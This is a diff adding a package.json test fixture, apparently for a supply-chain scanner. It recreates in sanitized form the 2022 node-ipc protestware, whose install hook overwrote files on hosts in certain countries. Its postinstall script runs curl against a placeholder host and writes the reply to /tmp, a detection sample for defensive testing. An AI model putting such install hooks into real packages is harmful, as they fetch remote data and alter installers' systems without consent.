@@ -1,0 +1,8 @@
+{
+  "name": "node-ipc-historic-fixture",
+  "version": "10.1.1",
+  "description": "Sanitized recreation of the March 2022 node-ipc@10.1.1 protestware. The live release shipped a postinstall that conditionally rewrote files on disk — overwriting non-source-file content with a heart emoji on hosts whose IP geolocated to specific countries. The detection signal chainsaw cares about is the same one any postinstall+network-touching script triggers: the postinstall reads remote state and writes to the filesystem outside node_modules. Placeholders stand in for the live geolocation host and target paths so this fixture carries no live exfil URLs or payload content.",
+  "scripts": {
+    "postinstall": "node -e \"require('child_process').exec('curl -s EXFIL_PLACEHOLDER/geo > /tmp/geo && cat /tmp/geo | xargs -I{} echo overwriting {}')\""
+  }
+}
